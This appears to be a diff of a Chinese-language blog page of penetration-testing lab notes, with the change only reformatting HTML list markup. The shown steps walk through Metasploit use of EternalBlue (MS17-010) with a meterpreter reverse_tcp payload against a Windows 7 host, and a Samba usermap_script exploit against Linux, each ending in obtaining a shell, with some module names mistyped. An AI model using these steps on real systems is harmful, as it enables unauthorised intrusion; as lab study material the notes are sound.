@@ -365,45 +365,26 @@ congratulation
 <li>run：开始生成一个文件  </li>
 <li>找到文件存放路径，将该文件放到win7以上的系统上面进行使用即可</li>
 </ol>
-<h3 id="渗透测试四"><a href="#渗透测试四" class="headerlink" title="渗透测试四"></a>渗透测试四</h3><p>永恒之蓝 ms17-010  即勒索病毒  </p>
+<h3 id="渗透测试四"><a href="#渗透测试四" class="headerlink" title="渗透测试四"></a>渗透测试四</h3><p>永恒之蓝 ms17-010 即勒索病毒  </p>
 <ol>
-<li><p>同上  </p>
-</li>
-<li><p>search ms-17-010  </p>
-</li>
-<li><p>use exploitwindows/smb/ms17-010-eternalblue  </p>
-</li>
-<li><p>show options      </p>
-</li>
-<li><p>set RHOST win7主机,set LHOST kali主机ip ：配置RHOST 和LHOST     </p>
-</li>
-<li><p>set payloads windows/x64/smb/meterpreter/reverse_tcp    </p>
-</li>
-<li><p>run：运行攻击    </p>
-</li>
-<li><p>拿shell，获取计算机权限。</p>
-</li>
-<li><p>遇到的问题，win7的网络模式需设置为桥接模式，否则在nat模式中是无法连接网络的。</p>
-<h3 id="渗透测试五"><a href="#渗透测试五" class="headerlink" title="渗透测试五"></a>渗透测试五</h3><p>linux漏洞  </p>
-</li>
-<li><p>进入msf</p>
-</li>
-<li><p>search scanner/samba  </p>
-</li>
-<li><p>use auxiliary/scanner/smb/smb_version：设置版本  </p>
-</li>
-<li><p>set RHOST ip地址  :设置被攻击ip  </p>
-</li>
-<li><p>run ：开始运行  </p>
-</li>
-<li><p>use expoit/multi/samba/usermap_script  </p>
-</li>
-<li><p>set RHOST ip地址：设置被攻击ip  </p>
-</li>
-<li><p>exploit ：开始攻击  </p>
-</li>
-<li><p>拿shell  </p>
-</li>
+<li>同上  </li>
+<li>search ms-17-010  </li>
+<li>use exploitwindows/smb/ms17-010-eternalblue  </li>
+<li>show options      </li>
+<li>set RHOST win7主机,set LHOST kali主机ip ：配置RHOST 和LHOST     </li>
+<li>set payloads windows/x64/smb/meterpreter/reverse_tcp    </li>
+<li>run：运行攻击    </li>
+<li>拿shell，获取计算机权限。  </li>
+<li>遇到的问题，win7的网络模式需设置为桥接模式，否则在nat模式中是无法连接网络的。<h3 id="渗透测试五"><a href="#渗透测试五" class="headerlink" title="渗透测试五"></a>渗透测试五</h3>linux漏洞  </li>
+<li>进入msf</li>
+<li>search scanner/samba  </li>
+<li>use auxiliary/scanner/smb/smb_version：设置版本  </li>
+<li>set RHOST ip地址  :设置被攻击ip  </li>
+<li>run ：开始运行  </li>
+<li>use expoit/multi/samba/usermap_script  </li>
+<li>set RHOST ip地址：设置被攻击ip  </li>
+<li>exploit ：开始攻击  </li>
+<li>拿shell  </li>
 </ol>
 <h3 id="另一种linux漏洞"><a href="#另一种linux漏洞" class="headerlink" title="另一种linux漏洞"></a>另一种linux漏洞</h3><p>影响了samba3.5以后的版本，不包括4.6.4/4.5.10/4.4.14 </p>
 <ol>
